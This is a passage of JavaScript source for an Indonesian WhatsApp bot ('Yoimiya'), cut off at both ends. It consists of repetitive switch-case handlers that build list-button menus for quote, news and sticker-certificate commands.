║◦ *${prefix}arahrezeki*
║◦ *${prefix}peruntungan*
║◦ *${prefix}weton*
║◦ *${prefix}karakter*
║◦ *${prefix}keberuntungan*
║◦ *${prefix}memancing*
║◦ *${prefix}masasubur*
║◦ *${prefix}zodiak*
║◦ *${prefix}shio*
┗━━━━━━━━━━━━━━⊱`
const bet = {
    title: "LIST MENU",
    sections: [
      {
        title: `ʟɪsᴛ ʏᴀɴɢ sᴇʀɪɴɢ ᴅɪᴘᴀᴋᴀɪ`, 
        highlight_label: `.ᴘᴏᴘᴜʟᴇʀ`,
        rows: [
          {
            title: "ᴀʟʟ ᴍᴇɴᴜ ʏᴏɪᴍɪʏᴀ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ sᴇᴍᴜᴀ ᴍᴇɴᴜ",
            id: `.allmenubutton`, 
          },
        ]},
        {
        title: `ᴍᴇɴᴜ ᴄʜᴀʀᴀᴄᴛᴇʀ.ᴀɪ`, 
        highlight_label: ``,
        rows: [
          {
            title: "ᴄʜᴀʀᴀᴄᴛᴇʀ.ᴀɪ ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ sᴇᴍᴜᴀ ᴍᴇɴᴜ",
            id: `.caibutton`, 
          },
        ]},
        {
        title: `ɴᴇᴡ ᴜᴘᴅᴀᴛᴇ`, 
        highlight_label: `ᴘᴇᴍʙᴀʀᴜᴀɴ ғɪᴛᴜʀ`,
        rows: [
          {
            title: "ɴᴇᴡ ᴜᴘᴅᴀᴛᴇ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ғɪᴛᴜʀ ʙᴀʀᴜ",
            id: `.newupdatebutton`, 
          },
          {
            title: "ғɪᴛᴜʀ ғɪx",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ғɪᴛᴜʀ ʏᴀɴɢ sᴜᴅᴀʜ ᴅɪ ғɪx",
            id: `.fixbutton`, 
          },
        ]},
      {
        title: `ʟɪsᴛ ᴍᴇɴᴜ ʏᴀɴɢ ᴅɪᴘɪsᴀʜᴋᴀɴ`, 
        highlight_label: ``,
        rows: [
          {
            title: "ʙᴀᴄᴀ ᴘᴇʀᴀᴛᴜʀᴀɴ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴘᴇʀᴀᴛᴜʀᴀɴ",
            id: `.bacaperaturanbutton`, 
          },
          {
            title: "ᴅᴏɴᴀsɪ",
            description: "ᴍeɴᴀᴍᴘɪʟᴋᴀɴ ᴍᴇɴᴜ ᴅᴏɴᴀsɪ",
            id: `.donasibutton`, 
          },
          {
            title: "ᴀɪ ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴏᴡɴᴇʀ ᴍᴇɴᴜ",
            id: `.aimenubutton`, 
          },
          {
            title: "ғᴜɴ ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ɢʀᴏᴜᴘ ᴍᴇɴᴜ",
            id: `.funmenubutton`, 
          },
          {
            title: "ʀᴘɢ ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ɢᴀᴍᴇs ᴍᴇɴᴜ",
            id: `.rpgmenubutton`, 
          },
          {
            title: "ᴘᴜsʜᴍᴇɴᴜ ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ʙᴇʀɪᴛᴀ ᴍᴇɴᴜ",
            id: `.pushmenubutton`, 
          },
          {
            title: "ɴғsᴡ ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴄᴘᴀɴᴇʟ ᴍᴇɴᴜ",
            id: `nfswmenubutton`, 
          },
          {
            title: "ɢᴀᴍᴇ ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴘʀɪᴍʙᴏɴ ᴍᴇɴᴜ",
            id: `.gamemenubutton`, 
          },
          {
            title: "sᴛᴏʀᴇ ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴅᴏᴡɴʟᴏᴀᴅ ᴍᴇɴᴜ",
            id: `.storemenubutton`, 
          },
          {
            title: "ᴀɴɪᴍᴇ ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴀɪ ᴍᴇɴᴜ",
            id: `.animebutton`, 
          },
          {
            title: "ᴏᴛʜᴇʀ ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴀɴɪᴍᴇ ᴍᴇɴᴜ",
            id: `.othermenubutton`, 
          },
          {
            title: "ᴏᴡɴᴇʀ ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴇᴘʜᴏᴛᴏ360 ᴍᴇɴᴜ",
            id: `.ownermenubutton`, 
          },
          {
            title: "ɢʀᴏᴜᴘ ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ Fuɴ ᴍᴇɴᴍ",
            id: `.groupmenubutton`, 
          },
          {
            title: "ɪsʟᴀᴍɪᴄ ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ɪsʟᴀᴍɪᴄ ᴍᴇɴᴜ",
            id: `.islamimenubutton`, 
          },
          {
            title: "ʙᴇʀɪᴛᴀ ᴍᴇɴᴜ ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴏᴛʜᴇʀs ᴍᴇɴᴜ",
            id: `.beritamenubutton`, 
          },
          {
            title: "ǫᴜᴏᴛᴇs ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ʀᴘɢ ᴍᴇɴᴜ",
            id: `.quotesmenubutton`, 
          },
          {
            title: "sᴛɪᴄᴋᴇʀ ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴀɴᴏɴʏᴍᴏᴜs ᴍᴇɴᴜ",
            id: `.stickermenubutton`, 
          },
          {
            title: "sᴛᴀʟᴋᴇʀ ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ʀᴀɴᴅᴏᴍ ᴠɪᴅᴇᴏ ᴍᴇɴᴜ",
            id: `.stalkermenubutton`, 
          },
          {
            title: "ᴘʀɪᴍʙᴏɴ ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴘʜᴏᴛᴏ ᴠɪᴅᴇᴏ ᴍᴇɴᴜ",
            id: `.primbonmenubutton`, 
          },
          {
            title: "sᴇʀᴛɪғɪᴋᴀᴛ ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ sᴛɪᴄᴋᴇʀ ᴍᴇɴᴜ",
            id: `.sertifikatmenubutton`, 
          },
          {
            title: "ᴅᴏᴡɴʟᴏᴀᴅ ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ǫᴜᴏᴛᴇs ᴍᴇɴᴜ",
            id: `.downloadmenubutton`, 
          },
          {
            title: "ᴇᴘʜᴏᴛᴏ360 ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ sᴛᴀʟᴋᴇʀ ᴍᴇɴᴜ",
            id: `.ephoto360menubutton`, 
          },
          { 
           title: "ᴀɴᴏɴʏᴍᴏᴜs ᴍᴇɴᴜ",
           description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴀɴᴏɴʏᴍᴏᴜs ᴍᴇɴᴜ",
           id: ".anonymousmenubutton",
           },
            { 
           title: "ʀᴀɴᴅᴏᴍ ᴠɪᴅᴇᴏ ᴍᴇɴᴜ",
           description: ".ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ʀᴀɴᴅᴏᴍ ᴠɪᴅᴇᴏ ᴍᴇɴᴜ",
           id: ".randomvideomenubutton",
           },
            { 
           title: "ʀᴀɴᴅᴏᴍ ᴘʜᴏᴛᴏ ᴍᴇɴᴜ",
           description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ʀᴀɴᴅᴏᴍ ᴘʜᴏᴛᴏ ᴍᴇɴᴜ",
           id: ".randomphotomenubutton",
           },
        ]},
            {
        title: `ɪɴғᴏʀᴍᴀsɪ ʏᴏɪᴍɪʏᴀ ᴀssɪsᴛᴇɴᴛ`, 
        highlight_label: `ᴅɪɴᴢɪᴅ ᴏғғᴄ`,
        rows: [
          {
            title: "ɪɴғᴏ ʙᴏᴛ",
            description: "ɪɴғᴏʀᴍᴀsɪ ʙᴏᴛ",
            id: `.infobot`,
            },
            {
             title: "ᴍᴇɴᴜ sɪᴍᴘʟᴇ",
            description: "ᴋᴇᴍʙᴀʟɪ ᴋᴇ ᴍᴇɴᴜ sɪᴍᴘᴇʟ",
            id: `.menu`, 
          },
        ]},
    ]}
    listbut2(m.chat, teks, bet, m)

}

break
case 'quotesmenubutton': {
let teks =`┏『 *\`乂 ᴏ̨ᴜᴏᴛᴇs-ᴍᴇɴᴜ 乂\`*  』━◧
║◦ *${prefix}quotesanime* 
║◦ *${prefix}quotesbacot* 
║◦ *${prefix}quotesbucin* 
║◦ *${prefix}quotesmotivasi* 
║◦ *${prefix}quotesgalau* 
║◦ *${prefix}quotesgombal* 
║◦ *${prefix}quoteshacker* 
║◦ *${prefix}quotesbijak* 
┗━━━━━━━━━━━━━━⊱`
const bet = {
    title: "LIST MENU",
    sections: [
      {
        title: `ʟɪsᴛ ʏᴀɴɢ sᴇʀɪɴɢ ᴅɪᴘᴀᴋᴀɪ`, 
        highlight_label: `.ᴘᴏᴘᴜʟᴇʀ`,
        rows: [
          {
            title: "ᴀʟʟ ᴍᴇɴᴜ ʏᴏɪᴍɪʏᴀ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ sᴇᴍᴜᴀ ᴍᴇɴᴜ",
            id: `.allmenubutton`, 
          },
        ]},
        {
        title: `ᴍᴇɴᴜ ᴄʜᴀʀᴀᴄᴛᴇʀ.ᴀɪ`, 
        highlight_label: ``,
        rows: [
          {
            title: "ᴄʜᴀʀᴀᴄᴛᴇʀ.ᴀɪ ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ sᴇᴍᴜᴀ ᴍᴇɴᴜ",
            id: `.caibutton`, 
          },
        ]},
        {
        title: `ɴᴇᴡ ᴜᴘᴅᴀᴛᴇ`, 
        highlight_label: `ᴘᴇᴍʙᴀʀᴜᴀɴ ғɪᴛᴜʀ`,
        rows: [
          {
            title: "ɴᴇᴡ ᴜᴘᴅᴀᴛᴇ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ғɪᴛᴜʀ ʙᴀʀᴜ",
            id: `.newupdatebutton`, 
          },
          {
            title: "ғɪᴛᴜʀ ғɪx",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ғɪᴛᴜʀ ʏᴀɴɢ sᴜᴅᴀʜ ᴅɪ ғɪx",
            id: `.fixbutton`, 
          },
        ]},
      {
        title: `ʟɪsᴛ ᴍᴇɴᴜ ʏᴀɴɢ ᴅɪᴘɪsᴀʜᴋᴀɴ`, 
        highlight_label: ``,
        rows: [
          {
            title: "ʙᴀᴄᴀ ᴘᴇʀᴀᴛᴜʀᴀɴ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴘᴇʀᴀᴛᴜʀᴀɴ",
            id: `.bacaperaturanbutton`, 
          },
          {
            title: "ᴅᴏɴᴀsɪ",
            description: "ᴍeɴᴀᴍᴘɪʟᴋᴀɴ ᴍᴇɴᴜ ᴅᴏɴᴀsɪ",
            id: `.donasibutton`, 
          },
          {
            title: "ᴀɪ ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴏᴡɴᴇʀ ᴍᴇɴᴜ",
            id: `.aimenubutton`, 
          },
          {
            title: "ғᴜɴ ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ɢʀᴏᴜᴘ ᴍᴇɴᴜ",
            id: `.funmenubutton`, 
          },
          {
            title: "ʀᴘɢ ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ɢᴀᴍᴇs ᴍᴇɴᴜ",
            id: `.rpgmenubutton`, 
          },
          {
            title: "ᴘᴜsʜᴍᴇɴᴜ ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ʙᴇʀɪᴛᴀ ᴍᴇɴᴜ",
            id: `.pushmenubutton`, 
          },
          {
            title: "ɴғsᴡ ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴄᴘᴀɴᴇʟ ᴍᴇɴᴜ",
            id: `nfswmenubutton`, 
          },
          {
            title: "ɢᴀᴍᴇ ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴘʀɪᴍʙᴏɴ ᴍᴇɴᴜ",
            id: `.gamemenubutton`, 
          },
          {
            title: "sᴛᴏʀᴇ ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴅᴏᴡɴʟᴏᴀᴅ ᴍᴇɴᴜ",
            id: `.storemenubutton`, 
          },
          {
            title: "ᴀɴɪᴍᴇ ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴀɪ ᴍᴇɴᴜ",
            id: `.animebutton`, 
          },
          {
            title: "ᴏᴛʜᴇʀ ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴀɴɪᴍᴇ ᴍᴇɴᴜ",
            id: `.othermenubutton`, 
          },
          {
            title: "ᴏᴡɴᴇʀ ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴇᴘʜᴏᴛᴏ360 ᴍᴇɴᴜ",
            id: `.ownermenubutton`, 
          },
          {
            title: "ɢʀᴏᴜᴘ ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ Fuɴ ᴍᴇɴᴍ",
            id: `.groupmenubutton`, 
          },
          {
            title: "ɪsʟᴀᴍɪᴄ ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ɪsʟᴀᴍɪᴄ ᴍᴇɴᴜ",
            id: `.islamimenubutton`, 
          },
          {
            title: "ʙᴇʀɪᴛᴀ ᴍᴇɴᴜ ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴏᴛʜᴇʀs ᴍᴇɴᴜ",
            id: `.beritamenubutton`, 
          },
          {
            title: "ǫᴜᴏᴛᴇs ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ʀᴘɢ ᴍᴇɴᴜ",
            id: `.quotesmenubutton`, 
          },
          {
            title: "sᴛɪᴄᴋᴇʀ ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴀɴᴏɴʏᴍᴏᴜs ᴍᴇɴᴜ",
            id: `.stickermenubutton`, 
          },
          {
            title: "sᴛᴀʟᴋᴇʀ ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ʀᴀɴᴅᴏᴍ ᴠɪᴅᴇᴏ ᴍᴇɴᴜ",
            id: `.stalkermenubutton`, 
          },
          {
            title: "ᴘʀɪᴍʙᴏɴ ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴘʜᴏᴛᴏ ᴠɪᴅᴇᴏ ᴍᴇɴᴜ",
            id: `.primbonmenubutton`, 
          },
          {
            title: "sᴇʀᴛɪғɪᴋᴀᴛ ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ sᴛɪᴄᴋᴇʀ ᴍᴇɴᴜ",
            id: `.sertifikatmenubutton`, 
          },
          {
            title: "ᴅᴏᴡɴʟᴏᴀᴅ ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ǫᴜᴏᴛᴇs ᴍᴇɴᴜ",
            id: `.downloadmenubutton`, 
          },
          {
            title: "ᴇᴘʜᴏᴛᴏ360 ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ sᴛᴀʟᴋᴇʀ ᴍᴇɴᴜ",
            id: `.ephoto360menubutton`, 
          },
          { 
           title: "ᴀɴᴏɴʏᴍᴏᴜs ᴍᴇɴᴜ",
           description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴀɴᴏɴʏᴍᴏᴜs ᴍᴇɴᴜ",
           id: ".anonymousmenubutton",
           },
            { 
           title: "ʀᴀɴᴅᴏᴍ ᴠɪᴅᴇᴏ ᴍᴇɴᴜ",
           description: ".ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ʀᴀɴᴅᴏᴍ ᴠɪᴅᴇᴏ ᴍᴇɴᴜ",
           id: ".randomvideomenubutton",
           },
            { 
           title: "ʀᴀɴᴅᴏᴍ ᴘʜᴏᴛᴏ ᴍᴇɴᴜ",
           description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ʀᴀɴᴅᴏᴍ ᴘʜᴏᴛᴏ ᴍᴇɴᴜ",
           id: ".randomphotomenubutton",
           },
        ]},
            {
        title: `ɪɴғᴏʀᴍᴀsɪ ʏᴏɪᴍɪʏᴀ ᴀssɪsᴛᴇɴᴛ`, 
        highlight_label: `ᴅɪɴᴢɪᴅ ᴏғғᴄ`,
        rows: [
          {
            title: "ɪɴғᴏ ʙᴏᴛ",
            description: "ɪɴғᴏʀᴍᴀsɪ ʙᴏᴛ",
            id: `.infobot`,
            },
            {
             title: "ᴍᴇɴᴜ sɪᴍᴘʟᴇ",
            description: "ᴋᴇᴍʙᴀʟɪ ᴋᴇ ᴍᴇɴᴜ sɪᴍᴘᴇʟ",
            id: `.menu`, 
          },
        ]},
    ]}
    listbut2(m.chat, teks, bet, m)

}

break
case 'beritamenubutton': {
let teks =`┏『 *\`乂 ʙ ᴇ ʀ ɪ ᴛ ᴀ - ᴍ ᴇ ɴ ᴜ 乂\`* 』━◧
║◦ *${prefix}fajar*
║◦ *${prefix}cnn*
║◦ *${prefix}layarkaca*
║◦ *${prefix}cnbc*
║◦ *${prefix}tribun*
║◦ *${prefix}indozone*
║◦ *${prefix}kompas*
║◦ *${prefix}detiknews*
║◦ *${prefix}dailynews*
║◦ *${prefix}inews*
║◦ *${prefix}okezone*
║◦ *${prefix}sindo*
║◦ *${prefix}tempo*
║◦ *${prefix}antara*
║◦ *${prefix}kontan*
║◦ *${prefix}merdeka*
║◦ *${prefix}jalantikus*
┗━━━━━━━━━━━━━━⊱`
const bet = {
    title: "LIST MENU",
    sections: [
      {
        title: `ʟɪsᴛ ʏᴀɴɢ sᴇʀɪɴɢ ᴅɪᴘᴀᴋᴀɪ`, 
        highlight_label: `.ᴘᴏᴘᴜʟᴇʀ`,
        rows: [
          {
            title: "ᴀʟʟ ᴍᴇɴᴜ ʏᴏɪᴍɪʏᴀ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ sᴇᴍᴜᴀ ᴍᴇɴᴜ",
            id: `.allmenubutton`, 
          },
        ]},
        {
        title: `ᴍᴇɴᴜ ᴄʜᴀʀᴀᴄᴛᴇʀ.ᴀɪ`, 
        highlight_label: ``,
        rows: [
          {
            title: "ᴄʜᴀʀᴀᴄᴛᴇʀ.ᴀɪ ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ sᴇᴍᴜᴀ ᴍᴇɴᴜ",
            id: `.caibutton`, 
          },
        ]},
        {
        title: `ɴᴇᴡ ᴜᴘᴅᴀᴛᴇ`, 
        highlight_label: `ᴘᴇᴍʙᴀʀᴜᴀɴ ғɪᴛᴜʀ`,
        rows: [
          {
            title: "ɴᴇᴡ ᴜᴘᴅᴀᴛᴇ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ғɪᴛᴜʀ ʙᴀʀᴜ",
            id: `.newupdatebutton`, 
          },
          {
            title: "ғɪᴛᴜʀ ғɪx",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ғɪᴛᴜʀ ʏᴀɴɢ sᴜᴅᴀʜ ᴅɪ ғɪx",
            id: `.fixbutton`, 
          },
        ]},
      {
        title: `ʟɪsᴛ ᴍᴇɴᴜ ʏᴀɴɢ ᴅɪᴘɪsᴀʜᴋᴀɴ`, 
        highlight_label: ``,
        rows: [
          {
            title: "ʙᴀᴄᴀ ᴘᴇʀᴀᴛᴜʀᴀɴ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴘᴇʀᴀᴛᴜʀᴀɴ",
            id: `.bacaperaturanbutton`, 
          },
          {
            title: "ᴅᴏɴᴀsɪ",
            description: "ᴍeɴᴀᴍᴘɪʟᴋᴀɴ ᴍᴇɴᴜ ᴅᴏɴᴀsɪ",
            id: `.donasibutton`, 
          },
          {
            title: "ᴀɪ ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴏᴡɴᴇʀ ᴍᴇɴᴜ",
            id: `.aimenubutton`, 
          },
          {
            title: "ғᴜɴ ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ɢʀᴏᴜᴘ ᴍᴇɴᴜ",
            id: `.funmenubutton`, 
          },
          {
            title: "ʀᴘɢ ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ɢᴀᴍᴇs ᴍᴇɴᴜ",
            id: `.rpgmenubutton`, 
          },
          {
            title: "ᴘᴜsʜᴍᴇɴᴜ ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ʙᴇʀɪᴛᴀ ᴍᴇɴᴜ",
            id: `.pushmenubutton`, 
          },
          {
            title: "ɴғsᴡ ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴄᴘᴀɴᴇʟ ᴍᴇɴᴜ",
            id: `nfswmenubutton`, 
          },
          {
            title: "ɢᴀᴍᴇ ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴘʀɪᴍʙᴏɴ ᴍᴇɴᴜ",
            id: `.gamemenubutton`, 
          },
          {
            title: "sᴛᴏʀᴇ ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴅᴏᴡɴʟᴏᴀᴅ ᴍᴇɴᴜ",
            id: `.storemenubutton`, 
          },
          {
            title: "ᴀɴɪᴍᴇ ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴀɪ ᴍᴇɴᴜ",
            id: `.animebutton`, 
          },
          {
            title: "ᴏᴛʜᴇʀ ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴀɴɪᴍᴇ ᴍᴇɴᴜ",
            id: `.othermenubutton`, 
          },
          {
            title: "ᴏᴡɴᴇʀ ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴇᴘʜᴏᴛᴏ360 ᴍᴇɴᴜ",
            id: `.ownermenubutton`, 
          },
          {
            title: "ɢʀᴏᴜᴘ ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ Fuɴ ᴍᴇɴᴍ",
            id: `.groupmenubutton`, 
          },
          {
            title: "ɪsʟᴀᴍɪᴄ ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ɪsʟᴀᴍɪᴄ ᴍᴇɴᴜ",
            id: `.islamimenubutton`, 
          },
          {
            title: "ʙᴇʀɪᴛᴀ ᴍᴇɴᴜ ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴏᴛʜᴇʀs ᴍᴇɴᴜ",
            id: `.beritamenubutton`, 
          },
          {
            title: "ǫᴜᴏᴛᴇs ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ʀᴘɢ ᴍᴇɴᴜ",
            id: `.quotesmenubutton`, 
          },
          {
            title: "sᴛɪᴄᴋᴇʀ ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴀɴᴏɴʏᴍᴏᴜs ᴍᴇɴᴜ",
            id: `.stickermenubutton`, 
          },
          {
            title: "sᴛᴀʟᴋᴇʀ ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ʀᴀɴᴅᴏᴍ ᴠɪᴅᴇᴏ ᴍᴇɴᴜ",
            id: `.stalkermenubutton`, 
          },
          {
            title: "ᴘʀɪᴍʙᴏɴ ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴘʜᴏᴛᴏ ᴠɪᴅᴇᴏ ᴍᴇɴᴜ",
            id: `.primbonmenubutton`, 
          },
          {
            title: "sᴇʀᴛɪғɪᴋᴀᴛ ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ sᴛɪᴄᴋᴇʀ ᴍᴇɴᴜ",
            id: `.sertifikatmenubutton`, 
          },
          {
            title: "ᴅᴏᴡɴʟᴏᴀᴅ ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ǫᴜᴏᴛᴇs ᴍᴇɴᴜ",
            id: `.downloadmenubutton`, 
          },
          {
            title: "ᴇᴘʜᴏᴛᴏ360 ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ sᴛᴀʟᴋᴇʀ ᴍᴇɴᴜ",
            id: `.ephoto360menubutton`, 
          },
          { 
           title: "ᴀɴᴏɴʏᴍᴏᴜs ᴍᴇɴᴜ",
           description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴀɴᴏɴʏᴍᴏᴜs ᴍᴇɴᴜ",
           id: ".anonymousmenubutton",
           },
            { 
           title: "ʀᴀɴᴅᴏᴍ ᴠɪᴅᴇᴏ ᴍᴇɴᴜ",
           description: ".ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ʀᴀɴᴅᴏᴍ ᴠɪᴅᴇᴏ ᴍᴇɴᴜ",
           id: ".randomvideomenubutton",
           },
            { 
           title: "ʀᴀɴᴅᴏᴍ ᴘʜᴏᴛᴏ ᴍᴇɴᴜ",
           description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ʀᴀɴᴅᴏᴍ ᴘʜᴏᴛᴏ ᴍᴇɴᴜ",
           id: ".randomphotomenubutton",
           },
        ]},
            {
        title: `ɪɴғᴏʀᴍᴀsɪ ʏᴏɪᴍɪʏᴀ ᴀssɪsᴛᴇɴᴛ`, 
        highlight_label: `ᴅɪɴᴢɪᴅ ᴏғғᴄ`,
        rows: [
          {
            title: "ɪɴғᴏ ʙᴏᴛ",
            description: "ɪɴғᴏʀᴍᴀsɪ ʙᴏᴛ",
            id: `.infobot`,
            },
            {
             title: "ᴍᴇɴᴜ sɪᴍᴘʟᴇ",
            description: "ᴋᴇᴍʙᴀʟɪ ᴋᴇ ᴍᴇɴᴜ sɪᴍᴘᴇʟ",
            id: `.menu`, 
          },
        ]},
    ]}
    listbut2(m.chat, teks, bet, m)

}

break
case 'sertifikatmenubutton': {
let teks =`┏『 *\`乂 ᴄᴇʀᴛɪꜰɪᴋᴀᴛ - ᴍᴇɴᴜ 乂\`* 』━━◧ 
║◦ *${prefix}stkbaik*
║◦ *${prefix}stkcantik*
║◦ *${prefix}stkganteng*
║◦ *${prefix}stkhitam*
║◦ *${prefix}stkmiskin*
║◦ *${prefix}stkkaya*
║◦ *${prefix}stkmarah*
║◦ *${prefix}stksabar*
║◦ *${prefix}stksakiti*
║◦ *${prefix}stkkeren*
║◦ *${prefix}stkstkmisterius*
║◦ *${prefix}stksantai*
║◦ *${prefix}stksombong*
║◦ *${prefix}stklucu*
║◦ *${prefix}stkgila*
┗━━━━━━━━━━━━━━⊱`
const bet = {
    title: "LIST MENU",
    sections: [
      {
        title: `ʟɪsᴛ ʏᴀɴɢ sᴇʀɪɴɢ ᴅɪᴘᴀᴋᴀɪ`, 
        highlight_label: `.ᴘᴏᴘᴜʟᴇʀ`,
        rows: [
          {
            title: "ᴀʟʟ ᴍᴇɴᴜ ʏᴏɪᴍɪʏᴀ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ sᴇᴍᴜᴀ ᴍᴇɴᴜ",
            id: `.allmenubutton`, 
          },
        ]},
        {
        title: `ᴍᴇɴᴜ ᴄʜᴀʀᴀᴄᴛᴇʀ.ᴀɪ`, 
        highlight_label: ``,
        rows: [
          {
            title: "ᴄʜᴀʀᴀᴄᴛᴇʀ.ᴀɪ ᴍᴇɴᴜ",
